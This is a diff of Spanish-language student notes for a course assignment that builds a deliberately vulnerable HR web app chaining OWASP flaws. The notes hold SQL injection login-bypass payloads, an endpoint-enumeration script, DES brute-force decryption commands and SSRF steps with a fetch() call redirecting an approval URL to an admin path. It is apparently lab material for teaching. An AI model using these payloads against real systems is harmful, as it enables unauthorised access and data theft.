@@ -2,18 +2,17 @@ Para el sql injection:
 
 * Se puede usar: ' OR '1'='1 tanto en DNI y Password. 
 * O usar: ' OR '1'='1' -- solo en DNI, porque el '--' hace que las demas condiciones de la query que ejecuta del lado de servidor sea comentada.
-
+' UNION SELECT * FROM users HAVING 1=1;--
 
 Script para hacer recon:
 
 const endpoints = [
     "/files/receipts",
     "/files/contracts",
-    "/files/tax-forms",
-    "/files/payslips",
-    "/files/medical-reports",
-    "/files/performance-reviews",
-    "/files/id-copies"
+    "/files/contratos",
+    "/files/fichajes",
+    "/files/contract",
+    "/files/contrataciones"
 ];
 
 const idStart = 750;
@@ -46,32 +45,17 @@ javac decrypt.java   -- comando para compilar
 java decrypt 755.des descifrado.pdf listado.txt  -- comando para ejecutar
 
 
-Debo hacer un trabajo en el cual construyo una aplicacion web vulnerable, de modo que pueda concatenar  las siguientes vulnerabilidades del 
-owasp top 10 (significa que explotar una vulnerabilidad me permita llegar a la siguiente, y asi sucesivamente):
-A3: sql Injection(para poder loguearme como un usuario), A1: Broken Access Control (para encontrar una ruta desde el inpector del navegador 
-que me permita acceder a algun archivo pdf), A2: Cryptographic Failures(para poder desencriptar ese archivo pdf encriptado con DES mediante 
-fuerza bruta), A10: Server-Side Request Forgery (SSRF) (dentro del pdf encontrado hay un link que nos permite explotar esta vulnerabilidad, 
-proponé como podriamos aplicar SSRF en este caso)
-Contexto de la aplicacion: aplicación web utilizada por empresas para la gestión de empleados y procesos de recursos humanos. La plataforma 
-permite a los empleados acceder a funcionalidades como: 
-Registro y actualización de datos personales.
-Consulta de nóminas y recibos de sueldo.
-Descarga de documentos laborales (contratos, certificados, etc.).
-
-Utilizaré la estructura que me indicaste anteriormente, por el momento solo necesito que me ayudes a crear la logica de login de forma tal que sea vulnerable a A3: sql Injection(se utilizará una base de datos mysql con una tabla usuarios con los campos dni, email, etc).
-
-
-
+http://localhost:8080/formV2024?ce=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZF9jb250cmFjdCI6Ijc1NSIsImVtYWlsIjoiZWplbXBsb0BnbWFpbC5jb20iLCJleHAiOjE3MzE5Nzc4MzN9.m0zs_OFw81j0zumwecwEvBm5GWrbENWkMGXloopGQRU
 
 SSRF
 
 Paso 1
-Acceder al formulario --> aceptar la propuesta (Se esta aceptando la propuesta del 755)
+Acceder al formulario --> aceptar la propuesta (Se esta aceptando la propuesta del 754)
 
 Paso 2
 Se observa que se hace aprobo la contratacion exitosamente, una llamada a http://localhost:8080/api/contract , donde se le pasa
    --->email: "ejemplo@gmail.com"
-   --->url: "https://tp-seg-app-web.onrender.com/api/approve/755"
+   --->url: "https://tp-seg-app-web.onrender.com/api/approve/754"
 
 Paso 3
 Se envia la solicitud pero cambiando la url por https://tp-seg-app-web.onrender.com/api/approve/admin;
@@ -132,7 +116,7 @@ fetch('http://localhost:8080/api/contract', {
     },
     body: JSON.stringify({
         email: "ejemplo@gmail.com",
-        url: "https://tp-seg-app-web.onrender.com/api/approve?id=879"
+        url: "https://tp-seg-app-web.onrender.com/api/approve/879"
     })
 })
 .then(response => {
